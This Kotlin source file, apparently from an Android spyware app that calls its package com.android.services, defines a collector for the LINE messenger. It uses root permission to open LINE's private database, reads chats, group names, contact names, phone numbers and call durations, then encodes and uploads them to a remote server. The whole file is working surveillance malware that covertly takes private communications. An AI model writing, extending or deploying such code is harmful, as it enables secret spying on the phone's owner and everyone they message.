package com.android.services.logs.collectors.im

import android.content.Context
import android.database.sqlite.SQLiteDatabase
import android.text.TextUtils
import com.android.services.db.entities.LineRooted
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerOneApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.RootPermission.acquireLineDatabasePermission
import com.android.services.util.logException
import com.android.services.util.logVerbose
import java.util.*
import java.util.regex.Pattern
import kotlin.collections.ArrayList

class LineRootedCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    override fun uploadLogs() {
        if (AppConstants.syncLine) {
            try {
                val lineList = retrieveLineMessages(context, localDatabaseSource)
                if (lineList.isNotEmpty()) {
                    val startDate = lineList[lineList.size - 1].date
                    val endDate = lineList[0].date
                    val mLineSender = RemoteServerHelper(
                        context,
                        AppConstants.LINE_ROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi,
                        startDate = startDate,
                        endDate = endDate
                    )
                    mLineSender.upload(lineList)
                }
            } catch (e: Exception) {
                logException(
                    "${AppConstants.LINE_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            }
        } else {
            logVerbose("${AppConstants.LINE_ROOTED_TYPE} sync is off")
        }
    }

    private fun retrieveLineMessages(
        context: Context,
        localDatabaseSource: LocalDatabaseSource,
    ): List<LineRooted> {
        var lineList = ArrayList<LineRooted>()
        try {
            acquireLineDatabasePermission()
            val lineDatabase = (AppConstants.LINE_DB_PATH
                    + "naver_line")
            val database = SQLiteDatabase.openDatabase(lineDatabase, null,
                SQLiteDatabase.OPEN_READONLY)
            val selection: String?
            val selectionArgs: Array<String>?
            val since: String
            val maxTimeStamp = localDatabaseSource.selectLineRootedMaxTimeStamp()
            since = maxTimeStamp?.toString() ?: "0"
            if (since.isNotEmpty()) {
                selection = String.format("%s > ?", "created_time")
                selectionArgs = arrayOf(since)
            } else {
                selection = null
                selectionArgs = null
            }

            // Obtain the list of Groups
            val groupList = HashMap<String, String>()
            val cur = database.query("groups", arrayOf("id", "name"), null, null, null, null, null)
            while (cur.moveToNext()) groupList[cur.getString(0)] = cur.getString(1)
            cur.close()

            // Get chat messages
            val c = database.query("chat_history", null, selection, selectionArgs, null, null, "" +
                    "created_time DESC")
            while (c.moveToNext()) {
                try {
                    val messageId = c.getString(c.getColumnIndex("id"))
                    val senderId = c.getString(c.getColumnIndex("from_mid"))
                    val conversationId = c.getString(c.getColumnIndex("chat_id"))
                    var message = c.getString(c.getColumnIndex("content"))
                    val messageType = c.getString(c.getColumnIndex("type"))
                    val messageDatetime = c.getString(c.getColumnIndex("created_time"))
                    if (messageType == "1" && TextUtils.isEmpty(message)) continue
                    val type = if (TextUtils.isEmpty(senderId)) "incoming" else "outgoing"
                    var conversationName: String? = ""
                    var senderName = ""
                    var senderNumber: String? = ""
                    var duration: String? = ""
                    var isCall = "0"
                    val queryStr = if (TextUtils.isEmpty(senderId)) conversationId else senderId!!

                    if (groupList.containsKey(conversationId)) {
                        if (senderId != null) {
                            val cursor = database.query("contacts",
                                arrayOf("name", "addressbook_name"),
                                "m_id=?",
                                arrayOf(senderId),
                                null,
                                null,
                                null)
                            if (cursor.moveToFirst()) {
                                senderName = cursor.getString(cursor.getColumnIndex("name"))
                                senderNumber =
                                    AppUtils.obtainPhoneNumberFromContactName(cursor.getString(0))
                            }
                            cursor.close()
                        }
                        conversationName = groupList[conversationId]
                    } else {
                        val cursor = database.query("contacts",
                            arrayOf("name", "addressbook_name"),
                            "m_id=?",
                            arrayOf(queryStr),
                            null,
                            null,
                            null)
                        if (cursor.moveToFirst()) {
                            senderName = cursor.getString(cursor.getColumnIndex("name"))
                            conversationName = senderName
                            senderNumber =
                                AppUtils.obtainPhoneNumberFromContactName(cursor.getString(0))
                        }
                        cursor.close()
                    }
                    if (messageType == "4") {
                        isCall = "1"
                        val pattern = Pattern.compile("Call History : (.+?) millisecs")
                        val matcher = pattern.matcher(message)
                        if (!matcher.find()) continue
                        duration =
                            AppUtils.formatDuration((matcher.group(1)
                                .toLong() / 1000).toString() + "")
                        message = AppUtils.convertStringToBase64("no message")
                    } else {
                        message = AppUtils.convertStringToBase64(message)
                    }

                    val lineRooted = LineRooted()
                    lineRooted.apply {
                        this.conversationId = conversationId
                        this.conversationName = conversationName ?: ""
                        this.message = message
                        this.type = type
                        this.messageDatetime = AppUtils.formatDate(messageDatetime)
                        this.isCall = isCall == "1"
                        this.duration = duration ?: ""
                        this.messageId = messageId
                        this.date = AppUtils.getDate(messageDatetime.toLong())
                        this.timeStamp = messageDatetime.toLong()
                    }
                    lineList.add(lineRooted)
                } catch (e: Exception) {
                    logVerbose(
                        "${AppConstants.LINE_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                        throwable = e
                    )
                }
            }
            c.close()
            database.close()
            logVerbose("${AppConstants.LINE_ROOTED_TYPE} rooted list = $lineList")
            if (lineList.isNotEmpty())
                localDatabaseSource.insertLineRooted(lineList)
            localDatabaseSource.selectLineRooted {
                lineList = it as ArrayList<LineRooted>
            }
            logVerbose("${AppConstants.LINE_ROOTED_TYPE} selected list = $lineList")
        } catch (e: Exception) {
            logVerbose(
                "${AppConstants.LINE_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                throwable = e
            )
        }
        return lineList
    }

}